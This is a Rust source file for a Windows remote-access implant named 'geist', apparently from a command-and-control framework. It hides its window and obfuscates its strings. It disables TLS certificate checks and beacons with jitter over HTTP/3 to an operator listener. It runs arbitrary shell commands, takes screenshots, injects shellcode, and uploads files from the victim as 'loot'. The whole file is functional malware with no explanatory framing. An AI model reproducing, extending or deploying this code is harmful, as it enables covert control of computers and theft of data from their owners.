#![windows_subsystem = "windows"]

mod obfuscate;
mod inject;
mod gatesofhell;

use std::collections::HashMap;
use std::env;
use std::fs;
use std::path::Path;
use std::process::Command as ProcessCommand;
use std::sync::Arc;
use std::time::Duration;

use base64::{engine::general_purpose, Engine as _};
use bytes::{Buf, Bytes};
use h3_quinn::Connection;
use hmac::{Hmac, Mac};
use http::{Method, Request, Uri};
use quinn::{ClientConfig, Endpoint};
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::Sha256;
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::Cursor;
use tokio::sync::Mutex;
use uuid::Uuid;
use screenshots::Screen;
use image::ImageOutputFormat;

type HmacSha256 = Hmac<Sha256>;

// Build-time configuration
macro_rules! env_or_default {
    ($env:expr, $default:expr) => {
        match option_env!($env) {
            Some(v) if !v.is_empty() => v,
            _ => $default,
        }
    };
}

const LISTENER_HOST: &str = env_or_default!("GEIST_HOST", "localhost");
const LISTENER_PORT: &str = env_or_default!("GEIST_PORT", "8081");
const LISTENER_ENDPOINT: &str = env_or_default!("GEIST_ENDPOINT", "/wiki");
const HMAC_KEY_HEX: &str = env_or_default!("GEIST_HMAC_KEY", "29b3249406c7185cd1bedc33c9b32acd147244bd87ebd9c83e7fc6692da2c4ce");
const RECONNECT_INTERVAL: u64 = 15;
const JITTER_SECONDS: u64 = 10;
const USER_AGENT: &str = env_or_default!("GEIST_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

const CHUNK_SIZE: usize = 2 * 1024 * 1024;
const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct AgentRegistration {
    uuid: String,
    name: String,
    ip: String,
    os: String,
    #[serde(rename = "agent_type")]
    agent_type: String,
    #[serde(rename = "reconnectInterval")]
    reconnect_interval: u64,
    privileges: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Command {
    id: i32,
    #[serde(rename = "agentId")]
    agent_id: String,
    command: String,
    #[serde(rename = "clientUsername")]
    client_username: String,
    status: String,
    output: String,
    #[serde(rename = "createdAt")]
    created_at: String,
    #[serde(rename = "executedAt")]
    executed_at: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CommandResponse {
    #[serde(rename = "commandId")]
    command_id: i32,
    output: String,
    status: String,
}

#[derive(Debug, Clone)]
struct AgentState {
    agent_id: String,
    reconnect_interval: u64,
    jitter_seconds: u64,
    current_command_id: i32,
    hmac_key: Vec<u8>,
}

impl AgentState {
    fn new() -> Self {
        let hmac_key = HMAC_KEY_HEX.as_bytes().to_vec();
        let reconnect_interval = option_env!("GEIST_INTERVAL")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(RECONNECT_INTERVAL);
        let jitter_seconds = option_env!("GEIST_JITTER")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(JITTER_SECONDS);
        
        Self {
            agent_id: Uuid::new_v4().to_string(),
            reconnect_interval,
            jitter_seconds,
            current_command_id: 0,
            hmac_key,
        }
    }
}

fn generate_hmac(message: &str, key: &[u8]) -> String {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(message.as_bytes());
    hex::encode(mac.finalize().into_bytes())
}

fn sign_request(method: &str, path: &str, body: &str, key: &[u8]) -> (String, String) {
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .to_string();
    let message = format!("{}{}{}{}", method, path, timestamp, body);
    let signature = generate_hmac(&message, key);
    (timestamp, signature)
}

fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let json_data = serde_json::to_string(data)?;
    let (timestamp, signature) = sign_request("POST", LISTENER_ENDPOINT, &json_data, key);

    let wrapper = json!({
        "agent_type": "geist",
        "data": serde_json::value::RawValue::from_string(json_data)?,
        "timestamp": timestamp,
        "signature": signature,
    });

    Ok(serde_json::to_vec(&wrapper)?)
}

async fn send_quic_request(
    endpoint: &Endpoint,
    path: &str,
    data: &[u8],
    headers: HashMap<String, String>,
) -> Result<Value, Box<dyn std::error::Error>> {
    let addr_str = format!("{}:{}", LISTENER_HOST, LISTENER_PORT);
    let server_addr = tokio::net::lookup_host(&addr_str)
        .await?
        .find(|addr| addr.is_ipv4())
        .ok_or("Failed to resolve hostname")?;

    let quinn_conn = endpoint.connect(server_addr, LISTENER_HOST)?.await?;
    let h3_conn = Connection::new(quinn_conn);
    let (mut driver, mut send_request) = h3::client::new(h3_conn).await?;
    
    tokio::spawn(async move {
        let _ = driver.wait_idle().await;
    });

    let uri: Uri = format!("{}://{}:{}{}", obfstr!("https"), LISTENER_HOST, LISTENER_PORT, path)
        .parse()?;

    let mut req = Request::builder()
        .method(Method::POST)
        .uri(uri)
        .header(obfstr!("user-agent"), USER_AGENT)
        .header(obfstr!("content-type"), obfstr!("application/json"));

    for (key, value) in headers {
        req = req.header(key, value);
    }

    let req = req.body(())?;

    let mut stream = send_request.send_request(req).await?;
    stream.send_data(Bytes::copy_from_slice(data)).await?;
    stream.finish().await?;

    let resp = stream.recv_response().await?;
    let status = resp.status().as_u16();

    let mut body = Vec::new();
    while let Some(mut chunk) = stream.recv_data().await? {
        body.extend_from_slice(chunk.chunk());
        chunk.advance(chunk.remaining());
    }

    let body_str = String::from_utf8_lossy(&body);

    Ok(json!({
        "status": status,
        "body": body_str
    }))
}

async fn register_agent(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<(), Box<dyn std::error::Error>> {
    let reg = AgentRegistration {
        uuid: state.agent_id.clone(),
        name: state.agent_id.clone(),
        ip: get_local_ip(),
        os: get_os_info(),
        agent_type: "geist".to_string(),
        reconnect_interval: state.reconnect_interval,
        privileges: get_privilege_info(),
    };

    let data = wrap_with_hmac(&serde_json::to_value(&reg)?, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Err(obfstr!("failed").into());
    }

    Ok(())
}

async fn get_pending_commands(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<Vec<Command>, Box<dyn std::error::Error>> {
    let poll_request = json!({ "agentId": state.agent_id });
    let data = wrap_with_hmac(&poll_request, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Ok(vec![]);
    }

    let body: Value = serde_json::from_str(response["body"].as_str().unwrap_or("{}"))?;
    let commands: Vec<Command> = serde_json::from_value(body["commands"].clone())?;

    Ok(commands)
}

async fn send_command_response(
    endpoint: &Endpoint,
    state: &AgentState,
    command_id: i32,
    output: String,
    status: String,
) -> Result<(), Box<dyn std::error::Error>> {
    let response = CommandResponse {
        command_id,
        output: output.clone(),
        status,
    };

    let mut headers = HashMap::new();
    if output.contains(&obfstr!("LOOT_ENTRIES:")) {
        headers.insert(obfstr!("type"), obfstr!("loot"));
    }

    let data = wrap_with_hmac(&serde_json::to_value(&response)?, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, headers).await?;
    Ok(())
}

fn parse_command(cmd: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut in_quote = false;
    let mut quote_char = ' ';
    let mut chars = cmd.chars().peekable();
    
    while let Some(c) = chars.next() {
        if !in_quote && (c == '"' || c == '\'') {
            in_quote = true;
            quote_char = c;
        } else if in_quote && c == quote_char {
            in_quote = false;
            quote_char = ' ';
        } else if !in_quote && c.is_whitespace() {
            if !current.is_empty() {
                parts.push(current.clone());
                current.clear();
            }
        } else {
            current.push(c);
        }
    }
    
    if !current.is_empty() {
        parts.push(current);
    }
    
    parts
}

async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    let parts = parse_command(cmd.trim());
    if parts.is_empty() {
        return Err(obfstr!("invalid").into());
    }

    let args: Vec<String> = parts[1..].iter().cloned().collect();

    let cmd_name = parts[0].as_str();
    if cmd_name == obfstr!("ls") {
        handle_ls(&args).await
    } else if cmd_name == obfstr!("get") {
        handle_get(&args, state, endpoint).await
    } else if cmd_name == obfstr!("put") {
        handle_put(&args).await
    } else if cmd_name == obfstr!("cd") {
        handle_cd(&args).await
    } else if cmd_name == obfstr!("kill") {
        handle_kill(&args).await
    } else if cmd_name == obfstr!("ps") {
        handle_ps(&args).await
    } else if cmd_name == obfstr!("exec") {
        if args.is_empty() {
            return Err(obfstr!("invalid arguments").into());
        }
        exec_system_command(&args.join(" ")).await
    } else if cmd_name == obfstr!("reconnect") {
        handle_reconnect(&args, state).await
    } else if cmd_name == obfstr!("rm") {
        handle_rm(&args).await
    } else if cmd_name == obfstr!("rmdir") {
        handle_rmdir(&args).await
    } else if cmd_name == obfstr!("jitter") {
        handle_jitter(&args, state).await
    } else if cmd_name == obfstr!("injectsc") {
        Ok(inject::handle_inject_sc(&args)?)
    } else if cmd_name == obfstr!("screenshot") {
        handle_screenshot().await
    } else {
        exec_system_command(cmd).await
    }
}

async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    
    let output = ProcessCommand::new(obfstr!("cmd"))
        .args(&[obfstr!("/C").as_str(), cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string()
        + &String::from_utf8_lossy(&output.stderr).to_string())
}

async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    let path = args.first().map(|s| s.as_str()).unwrap_or(".");
    let abs_path = fs::canonicalize(path)?;
    let abs_path_str = clean_path(&abs_path);
    
    let entries = fs::read_dir(&abs_path)?;

    let mut result = format!("{}\n", abs_path_str);
    let mut loot_entries = Vec::new();

    for entry in entries {
        let entry = entry?;
        let metadata = entry.metadata()?;
        let name = entry.file_name().to_string_lossy().to_string();
        let full_path = abs_path.join(&name);
        let full_path_str = clean_path(&full_path);

        if metadata.is_dir() {
            result.push_str(&format!("{}/\n", name));
            loot_entries.push(json!({
                "type": "directory",
                "path": full_path_str,
                "name": name,
                "size": 0,
            }));
        } else {
            let size = metadata.len();
            result.push_str(&format!("{} ({})\n", name, format_file_size(size)));
            loot_entries.push(json!({
                "type": "file",
                "path": full_path_str,
                "name": name,
                "size": size,
            }));
        }
    }

    if !loot_entries.is_empty() {
        result.push_str(&format!("\n{}:{}", obfstr!("LOOT_ENTRIES"), serde_json::to_string(&loot_entries)?));
    }

    Ok(result)
}

async fn handle_get(args: &[String], state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err(obfstr!("invalid arguments").into());
    }

    let path = Path::new(&args[0]);
    let metadata = fs::metadata(path)?;
    let file_size = metadata.len();

    if file_size < CHUNK_THRESHOLD {
        handle_get_small_file(path).await
    } else {
        handle_get_chunked_file(path, state, endpoint).await
    }
}

async fn handle_get_small_file(path: &Path) -> Result<String, Box<dyn std::error::Error>> {
    let content = fs::read(path)?;
    let hash = format!("{:x}", md5::compute(&content));
    let filename = path.file_name().unwrap().to_string_lossy();

    let loot_entry = json!({
        "type": "file",
        "name": filename,
        "path": clean_path(path),
        "size": content.len(),
        "content": general_purpose::STANDARD.encode(&content),
        "md5": hash,
    });

    Ok(format!("{}\n{}:{}", filename, obfstr!("LOOT_ENTRIES"), serde_json::to_string(&vec![loot_entry])?))
}

async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    let content = fs::read(path)?;
    let file_size = content.len() as u64;
    let filename = path.file_name().unwrap().to_string_lossy().to_string();
    
    let total_chunks = (file_size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let expected_md5 = format!("{:x}", md5::compute(&content));

    let session_id = initiate_chunked_transfer(
        endpoint,
        state,
        clean_path(path),
        filename.clone(),
        file_size,
        total_chunks,
        expected_md5.clone(),
    ).await?;

    for i in 0..total_chunks {
        let start = i * CHUNK_SIZE;
        let end = ((i + 1) * CHUNK_SIZE).min(content.len());
        let chunk_data = &content[start..end];
        let chunk_md5 = format!("{:x}", md5::compute(chunk_data));

        upload_chunk(endpoint, state, &session_id, i, chunk_data, &chunk_md5).await?;
    }

    complete_chunked_transfer(endpoint, state, &session_id).await?;

    Ok(format!("{} ({} {} {} {})", filename, file_size, obfstr!("bytes"), total_chunks, expected_md5))
}

async fn initiate_chunked_transfer(
    endpoint: &Endpoint,
    state: &AgentState,
    original_path: String,
    filename: String,
    total_size: u64,
    total_chunks: usize,
    expected_md5: String,
) -> Result<String, Box<dyn std::error::Error>> {
    
    let init_req = json!({
        "agentId": state.agent_id,
        "commandId": state.current_command_id,
        "filename": filename,
        "originalPath": original_path,
        "totalSize": total_size,
        "totalChunks": total_chunks,
        "expectedMd5": expected_md5,
    });

    let data = wrap_with_hmac(&init_req, &state.hmac_key)?;

    let response = send_quic_request(&endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    let result = if response["body"].is_string() {
        serde_json::from_str(response["body"].as_str().unwrap())?
    } else {
        response["body"].clone()
    };

    let session_id = result["sessionId"]
        .as_str()
        .ok_or("No session ID in response")?
        .to_string();

    Ok(session_id)
}

async fn upload_chunk(
    endpoint: &Endpoint,
    state: &AgentState,
    session_id: &str,
    chunk_index: usize,
    chunk_data: &[u8],
    chunk_md5: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let chunk_req = json!({
        "sessionId": session_id,
        "chunkIndex": chunk_index,
        "chunkData": general_purpose::STANDARD.encode(chunk_data),
        "chunkMd5": chunk_md5,
    });

    let data = wrap_with_hmac(&chunk_req, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    Ok(())
}

async fn complete_chunked_transfer(
    endpoint: &Endpoint,
    state: &AgentState,
    session_id: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let complete_req = json!({
        "sessionId": session_id,
        "complete": true,
    });

    let data = wrap_with_hmac(&complete_req, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    Ok(())
}

async fn handle_put(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.len() < 2 {
        return Err(obfstr!("invalid arguments").into());
    }

    let path = &args[0];
    let hex_data = args[1].trim_matches('"');
    let file_data = hex::decode(hex_data)?;

    let path_obj = Path::new(path);
    if let Some(parent) = path_obj.parent() {
        fs::create_dir_all(parent)?;
    }

    fs::write(path, &file_data)?;

    let hash = format!("{:x}", md5::compute(&file_data));
    let filename = path_obj.file_name().unwrap().to_string_lossy();
    let full_path = clean_path(&fs::canonicalize(path_obj)?);

    let loot_entry = json!({
        "type": "file",
        "name": filename,
        "path": full_path,
        "size": file_data.len(),
        "md5": hash,
    });

    Ok(format!("{}\n{}:{}", filename, obfstr!("LOOT_ENTRIES"), serde_json::to_string(&vec![loot_entry])?))
}

async fn handle_cd(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        let cwd = env::current_dir()?;
        return Ok(clean_path(&cwd));
    }

    env::set_current_dir(&args[0])?;
    let new_cwd = env::current_dir()?;
    Ok(clean_path(&new_cwd))
}

async fn handle_kill(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    tokio::spawn(async {
        tokio::time::sleep(Duration::from_secs(1)).await;
        std::process::exit(0);
    });
    Ok(obfstr!("ok"))
}

async fn handle_ps(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    get_windows_processes()
}

fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::Foundation::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let mut result = String::new();

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_string();
                result.push_str(&format!(
                    "{} {} {}\n",
                    entry.th32ProcessID, name, entry.th32ParentProcessID
                ));

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        Ok(result)
    }
}

async fn handle_reconnect(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Ok(format!("{}", state.reconnect_interval));
    }

    let new_interval: u64 = args[0].parse()?;
    if new_interval < 5 || new_interval > 3600 {
        return Err(obfstr!("invalid range").into());
    }

    state.reconnect_interval = new_interval;
    Ok(obfstr!("ok"))
}

async fn handle_rm(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err(obfstr!("invalid arguments").into());
    }

    let path = Path::new(&args[0]);
    if path.is_dir() {
        return Err(obfstr!("invalid target").into());
    }

    fs::remove_file(path)?;
    Ok(obfstr!("ok"))
}

async fn handle_rmdir(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err(obfstr!("invalid arguments").into());
    }

    let path = Path::new(&args[0]);
    if !path.is_dir() {
        return Err(obfstr!("invalid target").into());
    }

    fs::remove_dir_all(path)?;
    Ok(obfstr!("ok"))
}

async fn handle_jitter(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Ok(format!("{}", state.jitter_seconds));
    }

    let new_jitter: u64 = args[0].parse()?;
    if new_jitter > 300 {
        return Err(obfstr!("invalid range").into());
    }

    state.jitter_seconds = new_jitter;
    state.jitter_seconds = new_jitter;
    Ok(obfstr!("ok"))
}

async fn handle_screenshot() -> Result<String, Box<dyn std::error::Error>> {
    let screens = Screen::all()?;
    let mut result = String::new();
    let mut loot_entries = Vec::new();

    for (i, screen) in screens.iter().enumerate() {
        let image = screen.capture()?;
        let mut buffer = Vec::new();
        image.write_to(&mut Cursor::new(&mut buffer), ImageOutputFormat::Png)?;
        
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)?
            .as_secs();
            
        let filename = format!("screenshot_{}_{}.png", timestamp, i);
        let hash = format!("{:x}", md5::compute(&buffer));
        
        let loot_entry = json!({
            "type": "file",
            "name": filename,
            "path": "", // Empty path indicates loose file
            "size": buffer.len(),
            "content": general_purpose::STANDARD.encode(&buffer),
            "md5": hash,
        });
        
        loot_entries.push(loot_entry);
        result.push_str(&format!("Captured screen {} ({} bytes)\n", i, buffer.len()));
    }

    if !loot_entries.is_empty() {
        result.push_str(&format!("\n{}:{}", obfstr!("LOOT_ENTRIES"), serde_json::to_string(&loot_entries)?));
    }

    Ok(result)
}

fn clean_path(path: &Path) -> String {
    let path_str = path.display().to_string();
    if path_str.starts_with(r"\\?\") {
        path_str[4..].to_string()
    } else {
        path_str
    }
}

fn get_local_ip() -> String {
    use std::net::UdpSocket;
    
    match UdpSocket::bind(obfstr!("0.0.0.0:0").as_str()) {
        Ok(socket) => {
            match socket.connect(obfstr!("8.8.8.8:80").as_str()) {
                Ok(_) => {
                    match socket.local_addr() {
                        Ok(addr) => addr.ip().to_string(),
                        Err(_) => obfstr!("unknown"),
                    }
                }
                Err(_) => obfstr!("unknown"),
            }
        }
        Err(_) => obfstr!("unknown"),
    }
}

fn get_os_info() -> String {
    format!("{} {}", std::env::consts::OS, std::env::consts::ARCH)
}

fn get_privilege_info() -> String {
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::getuid() } == 0;
        serde_json::json!({
            "isRoot": is_root,
            "isAdmin": false
        }).to_string()
    }
    
    #[cfg(windows)]
    {
        let is_elevated = check_elevated();
        let is_admin = check_admin_group();
        
        serde_json::json!({
            "isRoot": is_elevated,
            "isAdmin": is_admin
        }).to_string()
    }
    
    #[cfg(not(any(unix, windows)))]
    {
        serde_json::json!({
            "isRoot": false,
            "isAdmin": false
        }).to_string()
    }
}

#[cfg(windows)]
fn check_elevated() -> bool {
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;
    use windows::Win32::Foundation::*;
    
    unsafe {
        let mut token: HANDLE = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_ok() {
            let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = 0u32;
            
            if GetTokenInformation(
                token,
                TokenElevation,
                Some(&mut elevation as *mut _ as *mut std::ffi::c_void),
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut size,
            ).is_ok() {
                let _ = CloseHandle(token);
                return elevation.TokenIsElevated != 0;
            }
            let _ = CloseHandle(token);
        }
    }
    false
}

#[cfg(windows)]
fn check_admin_group() -> bool {
    use windows::Win32::Security::*;
    use windows::Win32::Foundation::*;
    use windows::Win32::System::Threading::*;
    
    unsafe {
        // Create the Administrators group SID
        let sid_auth = SID_IDENTIFIER_AUTHORITY {
            Value: [0, 0, 0, 0, 0, 5], // SECURITY_NT_AUTHORITY
        };
        
        let mut admin_group = PSID::default();
        
        if AllocateAndInitializeSid(
            &sid_auth,
            2,
            0x00000020, // SECURITY_BUILTIN_DOMAIN_RID
            0x00000220, // DOMAIN_ALIAS_RID_ADMINS
            0, 0, 0, 0, 0, 0,
            &mut admin_group,
        ).is_err() {
            return false;
        }
        
        // Get current process token
        let mut token: HANDLE = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            FreeSid(admin_group);
            return false;
        }
        
        // Check if the user token contains the admin group SID
        let mut is_member = BOOL::default();
        let result = CheckTokenMembership(token, admin_group, &mut is_member);
        
        // Clean up
        let _ = CloseHandle(token);
        FreeSid(admin_group);
        
        if result.is_ok() {
            return is_member.as_bool();
        }
        
        false
    }
}

fn format_file_size(size: u64) -> String {
    let mut size_val = size as f64;
    let mut unit_idx = 0;

    while size_val >= 1024.0 && unit_idx < 4 {
        size_val /= 1024.0;
        unit_idx += 1;
    }

    let unit = match unit_idx {
        0 => obfstr!("B"),
        1 => obfstr!("K"),
        2 => obfstr!("M"),
        3 => obfstr!("G"),
        _ => obfstr!("T"),
    };
    
    format!("{:.1}{}", size_val, unit)
}

fn calculate_interval_with_jitter(base: u64, jitter: u64) -> u64 {
    if jitter == 0 {
        return base;
    }

    let mut rng = rand::thread_rng();
    let jitter_amount = rng.gen_range(0..=(jitter * 2)) as i64 - jitter as i64;
    let interval = base as i64 + jitter_amount;

    interval.max(1) as u64
}

async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> {
    let mut client_crypto = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(SkipServerVerification))
        .with_no_client_auth();

    client_crypto.alpn_protocols = vec![obfstr!("h3").as_bytes().to_vec()];

    let client_config = ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(client_crypto)?,
    ));

    let mut endpoint = Endpoint::client(obfstr!("0.0.0.0:0").parse()?)?;
    endpoint.set_default_client_config(client_config);

    Ok(endpoint)
}

#[derive(Debug)]
struct SkipServerVerification;

impl rustls::client::danger::ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA1,
            rustls::SignatureScheme::ECDSA_SHA1_Legacy,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
            rustls::SignatureScheme::ED448,
        ]
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = AgentState::new();

    if state.jitter_seconds > 0 {
        let initial_jitter = rand::thread_rng().gen_range(0..=state.jitter_seconds);
        tokio::time::sleep(Duration::from_secs(initial_jitter)).await;
    }

    let endpoint = create_quic_endpoint().await?;

    loop {
        if register_agent(&endpoint, &state).await.is_ok() {
            break;
        }
        tokio::time::sleep(Duration::from_secs(state.reconnect_interval)).await;
    }

    let state = Arc::new(Mutex::new(state));
    loop {
        let interval = {
            let state_guard = state.lock().await;
            calculate_interval_with_jitter(
                state_guard.reconnect_interval,
                state_guard.jitter_seconds,
            )
        };

        tokio::time::sleep(Duration::from_secs(interval)).await;

        let commands = {
            let state_guard = state.lock().await;
            match get_pending_commands(&endpoint, &state_guard).await {
                Ok(cmds) => cmds,
                Err(_) => continue,
            }
        };

        for cmd in commands {
            if cmd.status == "pending" {
                let mut state_guard = state.lock().await;
                state_guard.current_command_id = cmd.id;

                let output = match execute_command(&cmd.command, &mut state_guard, &endpoint).await {
                    Ok(out) => out,
                    Err(e) => format!("{}: {}", obfstr!("Error"), e),
                };

                let _ = send_command_response(
                    &endpoint,
                    &state_guard,
                    cmd.id,
                    output,
                    "completed".to_string(),
                )
                .await;
            }
        }
    }
}
